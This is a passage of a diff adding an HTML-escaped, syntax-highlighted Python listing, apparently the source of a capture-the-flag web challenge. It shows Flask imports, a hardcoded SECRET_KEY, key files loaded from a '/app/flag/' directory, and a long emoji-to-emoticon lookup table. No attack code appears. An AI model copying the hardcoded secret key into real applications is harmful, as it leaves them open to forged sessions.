+&lt;/span>&lt;span class="lnt">250
+&lt;/span>&lt;span class="lnt">251
+&lt;/span>&lt;span class="lnt">252
+&lt;/span>&lt;span class="lnt">253
+&lt;/span>&lt;span class="lnt">254
+&lt;/span>&lt;span class="lnt">255
+&lt;/span>&lt;span class="lnt">256
+&lt;/span>&lt;span class="lnt">257
+&lt;/span>&lt;span class="lnt">258
+&lt;/span>&lt;span class="lnt">259
+&lt;/span>&lt;span class="lnt">260
+&lt;/span>&lt;span class="lnt">261
+&lt;/span>&lt;span class="lnt">262
+&lt;/span>&lt;span class="lnt">263
+&lt;/span>&lt;span class="lnt">264
+&lt;/span>&lt;span class="lnt">265
+&lt;/span>&lt;span class="lnt">266
+&lt;/span>&lt;span class="lnt">267
+&lt;/span>&lt;span class="lnt">268
+&lt;/span>&lt;span class="lnt">269
+&lt;/span>&lt;span class="lnt">270
+&lt;/span>&lt;span class="lnt">271
+&lt;/span>&lt;span class="lnt">272
+&lt;/span>&lt;span class="lnt">273
+&lt;/span>&lt;span class="lnt">274
+&lt;/span>&lt;span class="lnt">275
+&lt;/span>&lt;span class="lnt">276
+&lt;/span>&lt;span class="lnt">277
+&lt;/span>&lt;span class="lnt">278
+&lt;/span>&lt;span class="lnt">279
+&lt;/span>&lt;span class="lnt">280
+&lt;/span>&lt;span class="lnt">281
+&lt;/span>&lt;span class="lnt">282
+&lt;/span>&lt;span class="lnt">283
+&lt;/span>&lt;span class="lnt">284
+&lt;/span>&lt;span class="lnt">285
+&lt;/span>&lt;span class="lnt">286
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">flask&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">redirect&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">url_for&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">flash&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">jsonify&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">make_response&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">flask_wtf&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">FlaskForm&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">wtforms&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">StringField&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PasswordField&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SubmitField&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">FileField&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TextAreaField&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">wtforms.validators&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">DataRequired&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Length&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">werkzeug.utils&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">secure_filename&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">authlib.jose&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">jwt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">JoseError&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;SECRET_KEY&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;36f8efbea152e50b23290e0ed707b4b0&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/app/flag/private_key.pem&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">private_key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/app/flag/public_key.pem&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">public_key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">game_play&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">emoji_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😀&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:D&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😉&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;;)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😊&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😋&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:P&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😎&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;B)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤔&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:?&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😐&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:|&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😥&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:&amp;#39;(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😮&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:o&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤐&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😯&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:o&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😪&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:&amp;#39;(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😫&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;gt;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😴&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Zzz&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😜&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;;P&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😝&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;XP&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😒&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🙃&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;(:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😲&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:O&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;☹️&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🙁&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😖&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;gt;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😞&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😤&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;gt;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😢&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:&amp;#39;(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😦&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😰&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😱&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:O&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤪&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:P&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😵&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;X(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🥴&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:P&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😠&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;gt;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😡&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;gt;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤕&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤢&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;X(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤮&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:P&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤧&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:&amp;#39;(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;😇&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;O:)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🥳&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:D&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🥺&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:&amp;#39;(&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤡&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:o)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤠&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Y)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🤥&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;:L&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐶&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;dog&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐱&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;cat&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐭&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;mouse&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐰&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;rabbit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🦊&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;fox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐷&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;pig&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐽&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;pig nose&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐸&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;frog&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐒&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;monkey&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐔&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;chicken&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐧&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;penguin&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🐦&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;bird&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🚗&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;car&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🚕&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;taxi&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🚁&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;helicopter&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🛶&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;canoe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;⛵&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;sailboat&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🚤&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;speedboat&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🛳️&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;passenger ship&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;⛴️&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;ferry&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🛥️&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;motor boat&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🚢&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;ship&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;👶&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;baby&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;💿&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;CD&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;📀&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;DVD&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;📱&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;phone&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;💻&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;laptop&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;⏰&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;alarm clock&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🕰️&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;mantelpiece clock&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;⌚&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;watch&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;📡&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;satellite antenna&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🔋&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;battery&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🔌&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;plug&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;🚩&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;flag&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;⭐&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;*&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;✖️&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;×&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;➗&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;÷&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
